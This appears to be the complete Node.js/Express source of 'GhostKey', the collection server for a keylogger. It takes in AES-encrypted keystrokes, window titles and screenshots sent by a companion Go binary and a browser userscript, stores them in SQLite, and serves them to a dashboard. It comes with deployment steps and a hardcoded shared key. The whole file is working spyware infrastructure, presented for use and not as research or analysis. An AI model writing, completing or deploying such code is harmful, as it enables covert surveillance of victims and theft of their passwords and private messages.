// GhostKey Backend v1.0 - Handles keys, windows, timestamps, screenshots
// Deploy on Render: npm init -y; npm i express sqlite3 crypto-js body-parser cors
// Run: node server.js

const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const CryptoJS = require('crypto-js');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const AES_KEY = "x93mK!qWeR7zL9p&2vN8bT5cY4fU6jH0"; // ← MATCH YOUR GO BINARY'S KEY!

// Middleware
app.use(cors());
app.use(bodyParser.json({ limit: '10mb' })); // Handle big screenshot payloads
app.use(express.static('public')); // Serve frontend files

// SQLite DB setup (stores everything)
const db = new sqlite3.Database(':memory:'); // Use file for persistence: './logs.db'
db.serialize(() => {
    db.run(`CREATE TABLE logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp TEXT,
        client TEXT,
        window TEXT,
        keys TEXT,
        screenshot TEXT,
        url TEXT
    )`);
});

// Decrypt function (matches Go's AES-GCM)
function decrypt(encryptedBase64) {
    try {
        const encrypted = CryptoJS.enc.Base64.parse(encryptedBase64);
        const decrypted = CryptoJS.AES.decrypt({ ciphertext: encrypted }, AES_KEY);
        return JSON.parse(decrypted.toString(CryptoJS.enc.Utf8));
    } catch (e) {
        console.error('Decrypt failed:', e);
        return null;
    }
}

// Original /log endpoint (for your userscript)
app.post('/log', (req, res) => {
    const { keys, url, sequence, timestamps, client } = req.body;
    const ts = new Date().toISOString().slice(0, 19).replace('T', ' ');
    const text = keys.join(''); // Simple join for display

    db.run(`INSERT INTO logs (timestamp, client, window, keys, screenshot, url) VALUES (?, ?, ?, ?, ?, ?)`,
        [ts, client, 'Browser', text, '', url]);

    res.status(200).send({ success: true });
});

// New /ghost endpoint (for GhostKey binary)
app.post('/ghost', (req, res) => {
    const { data: encrypted } = req.body;
    const payload = decrypt(encrypted);

    if (!payload) {
        return res.status(400).send({ error: 'Decrypt failed' });
    }

    const { client, ts, win, keys, Screenshot: screenshot } = payload;
    const keysText = Array.isArray(keys) ? keys.join('') : keys || '';

    db.run(`INSERT INTO logs (timestamp, client, window, keys, screenshot, url) VALUES (?, ?, ?, ?, ?, ?)`,
        [ts, client, win, keysText, screenshot || '', '']); // URL not in binary payload yet

    console.log(`Logged: ${client} in ${win}: ${keysText.substring(0, 50)}...`);
    res.status(200).send({ success: true });
});

// API to fetch logs for dashboard
app.get('/api/logs', (req, res) => {
    db.all(`SELECT * FROM logs ORDER BY id DESC LIMIT 50`, (err, rows) => {
        if (err) return res.status(500).send(err);
        res.json(rows);
    });
});

app.listen(PORT, () => {
    console.log(`GhostKey server running on port ${PORT}`);
});